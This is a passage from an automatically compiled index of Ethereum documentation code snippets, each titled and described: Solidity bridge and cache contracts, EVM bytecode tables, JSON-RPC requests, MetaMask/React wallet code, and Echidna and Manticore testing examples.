addr2);\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Web3 Module in Python\nDESCRIPTION: Python code to import the Web3 module from web3.py, which is the main gateway for interacting with Ethereum blockchain from Python applications.\n\nLANGUAGE: python\nCODE:\n```\nIn [1]: from web3 import Web3\n```\n\n----------------------------------------\n\nTITLE: Creating a Simple Hello World Smart Contract in Solidity\nDESCRIPTION: A basic smart contract that stores a message upon creation and can be updated by calling the update function. It demonstrates state variables, constructors, and public functions in Solidity.\n\nLANGUAGE: solidity\nCODE:\n```\n// Specifies the version of Solidity, using semantic versioning.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity ^0.7.0;\n\n// Defines a contract named `HelloWorld`.\n// A contract is a collection of functions and data (its state). Once deployed, a contract resides at a specific address on the Ethereum blockchain. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   // Declares a state variable `message` of type `string`.\n   // State variables are variables whose values are permanently stored in contract storage. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // Constructors are used to initialize the contract's data. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      message = newMessage;\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: FinalizeERC20Withdrawal Function for Completing L2 to L1 Transfers\nDESCRIPTION: Defines the function for finalizing withdrawals from L2 to L1. This is the second step in the L2→L1 process, occurring after the fault challenge period, which credits funds to the recipient's L1 balance.\n\nLANGUAGE: solidity\nCODE:\n```\n    /*************************\n     * Cross-chain Functions *\n     *************************/\n\n    /**\n     * @dev Complete a withdrawal from L2 to L1, and credit funds to the recipient's balance of the\n     * L1 ERC20 token.\n     * This call will fail if the initialized withdrawal from L2 has not been finalized.\n     *\n     * @param _l1Token Address of L1 token to finalizeWithdrawal for.\n     * @param _l2Token Address of L2 token where withdrawal was initiated.\n     * @param _from L2 address initiating the transfer.\n     * @param _to L1 address to credit the withdrawal to.\n     * @param _amount Amount of the ERC20 to deposit.\n     * @param _data Data provided by the sender on L2. This data is provided\n     *   solely as a convenience for external contracts. Aside from enforcing a maximum\n     *   length, these contracts provide no guarantees about its content.\n     */\n    function finalizeERC20Withdrawal(\n        address _l1Token,\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n    ) external;\n}\n```\n\n----------------------------------------\n\nTITLE: Completing ERC-20 Withdrawal Transfer and Event Emission\nDESCRIPTION: This code transfers ERC-20 tokens to the withdrawer's address on L1 and emits an event to indicate the withdrawal has been finalized. The safeTransfer method is used to handle ERC-20 token transfers safely.\n\nLANGUAGE: solidity\nCODE:\n```\n\n        // When a withdrawal is finalized on L1, the L1 Bridge transfers the funds to the withdrawer\n        // slither-disable-next-line reentrancy-events\n        IERC20(_l1Token).safeTransfer(_to, _amount);\n\n        // slither-disable-next-line reentrancy-events\n        emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount, _data);\n    }\n\n\n    /*****************************\n     * Temporary - Migrating ETH *\n     *****************************/\n\n    /**\n     * @dev Adds ETH balance to the account. This is meant to allow for ETH\n     * to be migrated from an old gateway to a new gateway.\n     * NOTE: This is left for one upgrade only so we are able to receive the migrated ETH from the\n     * old contract\n     */\n    function donateETH() external payable {}\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Uncle by Block Hash and Index Request in JavaScript\nDESCRIPTION: Example request for the eth_getUncleByBlockHashAndIndex method, which retrieves uncle information using a block hash and index position.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getUncleByBlockHashAndIndex\",\"params\":[\"0x1d59ff54b1eb26b013ce3cb5fc9dab3705b415a67127a003c3e61eb445bb8df2\", \"0x0\"],\"id\":1}'\n```\n\n----------------------------------------\n\nTITLE: Creating a Single Story File with Hoisted Display Name\nDESCRIPTION: Shows how to structure a story file with only one story where the story name matches the component title, causing it to be hoisted up in the Storybook sidebar.\n\nLANGUAGE: tsx\nCODE:\n```\nimport ButtonComponent from \".\"\n\nconst meta = {\n  title: \"Atoms / Form / Button\",\n  component: ButtonComponent,\n} satisfies Meta<typeof ButtonComponent>\n\nexport default meta\n\nexport const Button: StoryObj<typeof meta> = {\n  render: () => <ButtonComponent />,\n}\n```\n\n----------------------------------------\n\nTITLE: Constructor for Proxy Implementation\nDESCRIPTION: Defines a constructor that takes no effective parameters as the contract is designed to be used behind a proxy. The address(0) passed to CrossDomainEnabled is a placeholder since the actual values will be set during initialization.\n\nLANGUAGE: solidity\nCODE:\n```\n    /***************\n     * Constructor *\n     ***************/\n\n    // This contract lives behind a proxy, so the constructor parameters will go unused.\n    constructor() CrossDomainEnabled(address(0)) {}\n```\n\n----------------------------------------\n\nTITLE: Installing NPM Dependencies for NFT Development\nDESCRIPTION: Shell commands for initializing an NPM project and installing Hardhat as a development dependency. Hardhat is a development environment used for compiling, deploying and testing Ethereum smart contracts.\n\nLANGUAGE: bash\nCODE:\n```\nnpm init\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for Value Retrieval and Initial Processing\nDESCRIPTION: This section retrieves the stored value from storage slot 6 (interpreted as the contract's tracked value) and prepares for processing an incoming ETH transfer.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n| Offset | Código de operación | Pila (después del código de operación)                                              |\n| ------:| ------------------- | ----------------------------------------------------------------------------------- |\n|     64 | CALLVALUE           | [Wei](/glossary/#wei) proporcionado por la llamada. Llamado `msg.value` en Solidity |\n|     65 | PUSH1 0x06          | 6 CALLVALUE                                                                         |\n|     67 | PUSH1 0x00          | 0 6 CALLVALUE                                                                       |\n|     69 | DUP3                | CALLVALUE 0 6 CALLVALUE                                                             |\n|     6A | DUP3                | 6 CALLVALUE 0 6 CALLVALUE                                                           |\n|     6B | SLOAD               | Storage[6] CALLVALUE 0 6 CALLVALUE                                                  |\n```\n\n----------------------------------------\n\nTITLE: Installation de Waffle et ethers.js\nDESCRIPTION: Commandes pour installer Waffle et ethers.js, les bibliothèques principales pour tester les contrats Solidity.\n\nLANGUAGE: bash\nCODE:\n```\nyarn add --dev ethereum-waffle ethers\n# or if you're using npm\nnpm install ethereum-waffle ethers --save-dev\n```\n\n----------------------------------------\n\nTITLE: Basic Cache Functionality Test\nDESCRIPTION: Tests the basic write and read operations of the cache by writing squares of integers and verifying they can be read back correctly.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testCaching() public {\n        for(uint i=1; i<5000; i++) {\n            cache.cacheWrite(i*i);\n        }\n\n        for(uint i=1; i<5000; i++) {\n            assertEq(cache.cacheRead(i), i*i);\n        }\n    }    // testCaching\n```\n\n----------------------------------------\n\nTITLE: Cache Function and Class Closure in Solidity\nDESCRIPTION: Closing braces for the encodeVal function and the Cache contract/class, marking the end of their respective scopes in the Solidity code.\n\nLANGUAGE: solidity\nCODE:\n```\n}  // encodeVal\n\n}  // Cache\n```\n\n----------------------------------------\n\nTITLE: IL2StandardERC20 Interface Definition\nDESCRIPTION: Interface definition for L2 standard ERC-20 tokens that can be bridged between L1 and L2. Includes a function to get the corresponding L1 token address.\n\nLANGUAGE: solidity\nCODE:\n```\ninterface IL2StandardERC20 is IERC20, IERC165 {\n    function l1Token() external returns (address);\n```\n\n----------------------------------------\n\nTITLE: CHAINID Opcode Implementation in Istanbul\nDESCRIPTION: Reference to EIP-1344 which added the CHAINID opcode to protect Ethereum against replay attacks by allowing contracts to access the current chain's identifier.\n\nLANGUAGE: markdown\nCODE:\n```\ncode>CHAINID</code>\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration with Sequence Length and Gas Estimation\nDESCRIPTION: YAML configuration that enables gas estimation while reducing transaction sequence length for easier result interpretation.\n\nLANGUAGE: yaml\nCODE:\n```\nseqLen: 2\nestimateGas: true\n```\n\n----------------------------------------\n\nTITLE: Finalizing ETH Withdrawal from L2 to L1 in Solidity\nDESCRIPTION: Implementation of the function that finalizes ETH withdrawals from L2 to L1. It verifies the message comes from the L2 token bridge, transfers ETH to the recipient, and emits an event to confirm the withdrawal.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction finalizeETHWithdrawal(\n    address _from,\n    address _to,\n    uint256 _amount,\n    bytes calldata _data\n) external onlyFromCrossDomainAccount(l2TokenBridge) {\n    // slither-disable-next-line reentrancy-events\n    (bool success, ) = _to.call{ value: _amount }(new bytes(0));\n    require(success, \"TransferHelper::safeTransferETH: ETH transfer failed\");\n\n    // slither-disable-next-line reentrancy-events\n    emit ETHWithdrawalFinalized(_from, _to, _amount, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Sync Event\nDESCRIPTION: Declares an event emitted whenever token reserves are updated, providing the latest information about reserve balances and therefore the current exchange rate.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Sync(uint112 reserve0, uint112 reserve1);\n```\n\n----------------------------------------\n\nTITLE: Creating a Faucet Transaction with Minimal Calldata\nDESCRIPTION: Example showing how to manually create a transaction to call the token faucet function through the CalldataInterpreter. This demonstrates the use of minimal calldata (just 0x01) to trigger a function.\n\nLANGUAGE: javascript\nCODE:\n```\n    // Get tokens to play with\n    const faucetTx = {\n      to: cdi.address,\n      data: \"0x01\"\n    }\n    await (await signer.sendTransaction(faucetTx)).wait()\n```\n\n----------------------------------------\n\nTITLE: Checking Ethereum Balance with JSON-RPC Response\nDESCRIPTION: Example JSON-RPC response from an eth_getBalance request showing the balance in wei. This demonstrates how to verify that test Ether has been successfully added to the wallet before minting NFTs.\n\nLANGUAGE: text\nCODE:\n```\n{\"jsonrpc\": \"2.0\", \"id\": 0, \"result\": \"0xde0b6b3a7640000\"}\n```\n\n----------------------------------------\n\nTITLE: Checking Ethereum Balance with JSON-RPC Response\nDESCRIPTION: Example JSON-RPC response from an eth_getBalance request showing the balance in wei. This demonstrates how to verify that test Ether has been successfully added to the wallet before minting NFTs.\n\nLANGUAGE: text\nCODE:\n```\n{\"jsonrpc\": \"2.0\", \"id\": 0, \"result\": \"0xde0b6b3a7640000\"}\n```\n\n----------------------------------------\n\nTITLE: Checking Node Synchronization Status with eth_syncing\nDESCRIPTION: This method returns an object with data about the synchronization status or 'false' when not syncing. The response varies between client implementations but includes basic information about starting, current, and highest blocks.\n\nLANGUAGE: js\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_syncing\",\"params\":[],\"id\":1}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": {\n    startingBlock: '0x384',\n    currentBlock: '0x386',\n    highestBlock: '0x454'\n  }\n}\n// Or when not syncing\n{\n  \"id\":1,\n  \"jsonrpc\": \"2.0\",\n  \"result\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Encoding Key Values with Size-Based Prefixes in Solidity\nDESCRIPTION: This function encodes key values by prepending a prefix byte that indicates the length of the data. It handles different key ranges up to 16*256^15, adding specific prefix bytes based on the key size. The function includes error handling for values outside the expected range.\n\nLANGUAGE: solidity\nCODE:\n```\n// There is probably a clever way to do the following lines as a loop,\n// but it's a view function so I'm optimizing for programmer time and\n// simplicity.\n\nif (_key < 16*256**2)\n    return bytes.concat(bytes3(uint24(_key) | (0x2 * 16 * 256**2)));\nif (_key < 16*256**3)\n    return bytes.concat(bytes4(uint32(_key) | (0x3 * 16 * 256**3)));\n     .\n     .\n     .\nif (_key < 16*256**14)\n    return bytes.concat(bytes15(uint120(_key) | (0xE * 16 * 256**14)));\nif (_key < 16*256**15)\n    return bytes.concat(bytes16(uint128(_key) | (0xF * 16 * 256**15)));\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for Value Storage Update\nDESCRIPTION: Final section that stores the updated value (original stored value + call value) back into storage slot 6, effectively tracking the total ETH received by the contract.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n| Offset | Código de operación | Pila                              |\n| ------:| ------------------- | --------------------------------- |\n|     75 | JUMPDEST            | Value\\*+CALLVALUE 0 6 CALLVALUE |\n|     76 | SWAP1               | 0 Value\\*+CALLVALUE 6 CALLVALUE |\n|     77 | SWAP2               | 6 Value\\*+CALLVALUE 0 CALLVALUE |\n|     78 | SSTORE              | 0 CALLVALUE                       |\n```\n\n----------------------------------------\n\nTITLE: Reading Message from Smart Contract\nDESCRIPTION: Asynchronous JavaScript function to read the current message stored in the smart contract and print it to the console.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// ...\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n}\nmain()\n```\n\n----------------------------------------\n\nTITLE: Importing connectWallet Function in React Component\nDESCRIPTION: This code shows the import statement and state variables setup in a React component that will use the connectWallet function. It establishes the state variables needed to track wallet connection status.\n\nLANGUAGE: javascript\nCODE:\n```\nimport { useEffect, useState } from \"react\";\nimport { connectWallet } from \"./utils/interact.js\";\n\nconst Minter = (props) => {\n\n  //State variables\n  const [walletAddress, setWallet] = useState(\"\");\n  const [status, setStatus] = useState(\"\");\n  const [name, setName] = useState(\"\");\n  const [description, setDescription] = useState(\"\");\n  const [url, setURL] = useState(\"\");\n```\n\n----------------------------------------\n\nTITLE: Testing Parameter Reading with Cache in Solidity\nDESCRIPTION: Test function for the parameter reading functionality that uses low-level call to interact with the cache contract and verify correct parameter handling.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testReadParam() public {\n        address _cacheAddr = address(cache);\n        bool _success;\n        bytes memory _callInput;\n        bytes memory _callOutput;\n\n        // First call, the cache is empty\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n            // First value, add it to the cache\n            cache.INTO_CACHE(),\n            bytes32(VAL_A),\n             .\n             .\n             .\n        );\n        (_success, _callOutput) = _cacheAddr.call(_callInput);\n        assertEq(_success, true);\n        assertEq(cache.cacheRead(1), VAL_A);\n        assertEq(cache.cacheRead(2), VAL_C);\n        assertEq(toUint256(_callOutput,0), VAL_A);\n        assertEq(toUint256(_callOutput,32), VAL_B);\n        assertEq(toUint256(_callOutput,64), VAL_C);\n        assertEq(toUint256(_callOutput,96), VAL_C);\n\n        // Second call, we can use the cache\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n\n            // First value in the Cache\n            bytes1(0x01),\n            // Second value, don't add it to the cache\n            cache.DONT_CACHE(),\n            bytes32(VAL_B),\n\n            // Third and fourth values, same value\n            bytes1(0x02),\n            bytes1(0x02)\n        );\n        .\n        .\n        .\n    }   // testReadParam\n```\n\n----------------------------------------\n\nTITLE: RETURN Operation in EVM (F3)\nDESCRIPTION: Halts execution and returns data from memory. This opcode is used to return output from a function or contract execution.\n\nLANGUAGE: solidity\nCODE:\n```\nreturn mem[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Defining Function Signature Constant for External Calls\nDESCRIPTION: Defining a constant for the function signature to facilitate calling the cached function externally. This is needed because the function doesn't follow standard ABI specifications.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Make it easier to call us\n    // Function signature for writeEntryCached(), courtesy of\n    // https://www.4byte.directory/signatures/?bytes4_signature=0xe4e4f2d3\n    bytes4 constant public WRITE_ENTRY_CACHED = 0xe4e4f2d3;\n```\n\n----------------------------------------\n\nTITLE: Importing and Using getCurrentWalletConnected in React Component\nDESCRIPTION: This snippet shows how to import both wallet connection functions and use them in a React component. It updates the import statement to include the new function.\n\nLANGUAGE: javascript\nCODE:\n```\nimport { useEffect, useState } from \"react\"\nimport {\n  connectWallet,\n  getCurrentWalletConnected, //import here\n} from \"./utils/interact.js\"\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Modified Corpus\nDESCRIPTION: Example of running Echidna after modifying the corpus to include parameters that will trigger the property violation in the magic contract.\n\nLANGUAGE: bash\nCODE:\n```\n$ echidna-test magic.sol --config config.yaml\n...\nechidna_magic_values: failed!💥\n  Call sequence:\n    magic(42,129,333,0)\n\n\nUnique instructions: 142\nUnique codehashes: 1\nSeed: -7293830866560616537\n```\n\n----------------------------------------\n\nTITLE: Referencing SELFDESTRUCT Deprecation in Shanghai EIP\nDESCRIPTION: Codice che fa riferimento all'EIP-6049 che depreca l'istruzione SELFDESTRUCT nell'aggiornamento Shanghai.\n\nLANGUAGE: html\nCODE:\n```\n<code>SELFDESTRUCT</code>\n```\n\n----------------------------------------\n\nTITLE: Generating Zero-Knowledge Proof\nDESCRIPTION: Uses the computed witness to generate a zero-knowledge proof that can be verified on-chain without revealing the actual map contents.\n\nLANGUAGE: typescript\nCODE:\n```\nconst proof = zokrates.generateProof(\n    digCompiled.program,\n    runResults.witness,\n    proverKey)\n\nreturn proof\n```\n\n----------------------------------------\n\nTITLE: Second Import Section for Optimism L2 Bridge in Solidity\nDESCRIPTION: Additional library and contract imports including OpenZeppelin's ERC165 checker, cross-domain functionality, and predeploy address constants required for the bridge operation.\n\nLANGUAGE: solidity\nCODE:\n```\n/* Library Imports */\nimport { ERC165Checker } from \"@openzeppelin/contracts/utils/introspection/ERC165Checker.sol\";\nimport { CrossDomainEnabled } from \"../../libraries/bridge/CrossDomainEnabled.sol\";\nimport { Lib_PredeployAddresses } from \"../../libraries/constants/Lib_PredeployAddresses.sol\";\n\n/* Contract Imports */\nimport { IL2StandardERC20 } from \"../../standards/IL2StandardERC20.sol\";\n\n/**\n * @title L2StandardBridge\n * @dev The L2 Standard bridge is a contract which works together with the L1 Standard bridge to\n * enable ETH and ERC20 transitions between L1 and L2.\n * This contract acts as a minter for new tokens when it hears about deposits into the L1 Standard\n * bridge.\n * This contract also acts as a burner of the tokens intended for withdrawal, informing the L1\n * bridge to release L1 funds.\n */\ncontract L2StandardBridge is IL2ERC20Bridge, CrossDomainEnabled {\n    /********************************\n     * External Contract References *\n     ********************************/\n\n    address public l1TokenBridge;\n```\n\n----------------------------------------\n\nTITLE: Retrieving Currently Connected Wallet in JavaScript\nDESCRIPTION: Function that checks if MetaMask is installed and returns the currently connected wallet address along with a status message. It uses the eth_accounts method to retrieve connected addresses.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const getCurrentWalletConnected = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_accounts\",\n      })\n      if (addressArray.length > 0) {\n        return {\n          address: addressArray[0],\n          status: \"👆🏽 Write a message in the text-field above.\",\n        }\n      } else {\n        return {\n          address: \"\",\n          status: \"🦊 Connect to MetaMask using the top right button.\",\n        }\n      }\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Required Dependencies for L2StandardERC20\nDESCRIPTION: Imports the standard OpenZeppelin ERC20 contract which provides the base token functionality.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n```\n\n----------------------------------------\n\nTITLE: Safe Math Operations in EVM Bytecode\nDESCRIPTION: EVM bytecode implementing safe mathematical operations to prevent overflows and underflows when manipulating token balances. The code includes error checking and throws exceptions when calculations would result in invalid values.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\nPUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0xF1A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xEDF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xEC4 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xF0C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 P\n```\n\n----------------------------------------\n\nTITLE: Styling React Components with CSS in a Translation-Friendly Way\nDESCRIPTION: Demonstrates how to properly handle text styling for internationalization by using CSS transforms rather than hardcoding uppercase text in translation strings.\n\nLANGUAGE: json\nCODE:\n```\n\"page-warning\": \"Be very careful\"\n```\n\n----------------------------------------\n\nTITLE: Implementing setApprovalForAll in ERC-721 Vyper Contract\nDESCRIPTION: This function enables or disables an operator to manage all tokens of the sender. It includes a check to prevent setting yourself as an operator and emits an ApprovalForAll event.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef setApprovalForAll(_operator: address, _approved: bool):\n    \"\"\"\n    @dev Enables or disables approval for a third party (\"operator\") to manage all of\n         `msg.sender`'s assets. It also emits the ApprovalForAll event.\n         Throws if `_operator` is the `msg.sender`. (NOTE: This is not written the EIP)\n    @notice This works even if sender doesn't own any tokens at the time.\n    @param _operator Address to add to the set of authorized operators.\n    @param _approved True if the operators is approved, false to revoke approval.\n    \"\"\"\n    # Throws if `_operator` is the `msg.sender`\n    assert _operator != msg.sender\n    self.ownerToOperators[msg.sender][_operator] = _approved\n    log ApprovalForAll(msg.sender, _operator, _approved)\n```\n\n----------------------------------------\n\nTITLE: Retrieving Uncle by Block Number and Index Request in JavaScript\nDESCRIPTION: Example request for the eth_getUncleByBlockNumberAndIndex method, which retrieves uncle information using a block number and index position.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getUncleByBlockNumberAndIndex\",\"params\":[\"0x29c\", \"0x0\"],\"id\":1}'\n```\n\n----------------------------------------\n\nTITLE: swapExactTokensForETH Implementation\nDESCRIPTION: Allows users to swap an exact amount of tokens for a minimum amount of ETH. The function performs the token swap to WETH, unwraps the WETH, and transfers the resulting ETH to the recipient.\n\nLANGUAGE: solidity\nCODE:\n```\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    {\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, address(this));\n        IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n    }\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode Instructions for Token Transfer in Ethereum Smart Contract\nDESCRIPTION: A sequence of EVM (Ethereum Virtual Machine) bytecode instructions for token transfer operations. This snippet includes storage operations (MSTORE, SSTORE), address manipulation, and event emission functionality that forms part of an ERC20 transfer implementation.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nMSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0xDC1 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP\n```\n\n----------------------------------------\n\nTITLE: Importing Wallet Connection Functions in React Component\nDESCRIPTION: Code showing how to import the connectWallet function from a utility file in a React component. This is the first step in setting up wallet connectivity in the Minter.js file.\n\nLANGUAGE: javascript\nCODE:\n```\nimport { useEffect, useState } from \"react\";\nimport { connectWallet } from \"./utils/interact.js\";\n\nconst Minter = (props) => {\n\n  //State variables\n  const [walletAddress, setWallet] = useState(\"\");\n  const [status, setStatus] = useState(\"\");\n  const [name, setName] = useState(\"\");\n  const [description, setDescription] = useState(\"\");\n  const [url, setURL] = useState(\"\");\n```\n\n----------------------------------------\n\nTITLE: EVM Opcode Example: CODECOPY (0x39)\nDESCRIPTION: The CODECOPY opcode copies the executing contract's bytecode to memory. It takes destination offset, offset in code, and length from the stack.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[dstOst:dstOst+len-1] := this.code[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Querying Average Daily Block Gas Limit in Ethereum\nDESCRIPTION: SQL query that calculates the average daily gas limit of Ethereum blocks by retrieving data from the ethereum.blocks table, grouping results by day, and offsetting by 1 to avoid potential outliers.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    AVG(gas_limit) AS avg_block_gas_limit\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n```\n\n----------------------------------------\n\nTITLE: Testing Proxy Setup with Ethers.js in JavaScript\nDESCRIPTION: Test code to deploy the token and CalldataInterpreter contracts, and set up the proxy relationship between them. This is the initialization phase of the testing process.\n\nLANGUAGE: javascript\nCODE:\n```\nconst Cdi = await ethers.getContractFactory(\"CalldataInterpreter\")\nconst cdi = await Cdi.deploy(token.address)\nawait cdi.deployed()\nawait token.setProxy(cdi.address)\n\nconsole.log(\"CalldataInterpreter addr:\", cdi.address)\n\n// Need two signers to verify allowances\nconst signers = await ethers.getSigners()\nconst signer = signers[0]\nconst poorSigner = signers[1]\n```\n\n----------------------------------------\n\nTITLE: Testing Long Calldata Processing in Solidity Cache Contract\nDESCRIPTION: Test function that verifies the cache contract correctly handles excess calldata. It adds multiple values to the cache and includes an extra value to ensure the contract doesn't revert when receiving more data than expected.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction testLongCalldata() public {\n        address _cacheAddr = address(cache);\n        bool _success;\n        bytes memory _callInput;\n        bytes memory _callOutput;\n\n        // First call, the cache is empty\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n\n            // First value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_A),\n\n            // Second value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_B),\n\n            // Third value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_C),\n\n            // Fourth value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_D),\n\n            // And another value for \"good luck\"\n            bytes4(0x31112233)\n        );\n```\n\n----------------------------------------\n\nTITLE: Checking Reverted Executions in Ethereum Contracts with Manticore\nDESCRIPTION: This Python snippet iterates through terminated states in a Manticore analysis of Ethereum contracts, identifies transactions that resulted in REVERT or INVALID operations, and generates a test case when specific conditions are met. It filters out a specific path condition where a symbolic variable equals 65.\n\nLANGUAGE: python\nCODE:\n```\n## Check if an execution ends with a REVERT or INVALID\nfor state in m.terminated_states:\n    last_tx = state.platform.transactions[-1]\n    if last_tx.result in ['REVERT', 'INVALID']:\n        # we do not consider the path were a == 65\n        condition = symbolic_var != 65\n        if m.generate_testcase(state, name=\"BugFound\", only_if=condition):\n            print(f'Bug found, results are in {m.workspace}')\n            no_bug_found = False\n\nif no_bug_found:\n    print(f'No bug found')\n```\n\n----------------------------------------\n\nTITLE: Importing Cache Contract for Testing in Solidity\nDESCRIPTION: Import statement for the Cache contract that will be tested.\n\nLANGUAGE: solidity\nCODE:\n```\nimport \"src/Cache.sol\";\n```\n\n----------------------------------------\n\nTITLE: JSON-RPC Request and Response for eth_newPendingTransactionFilter\nDESCRIPTION: Example of creating a filter to monitor new 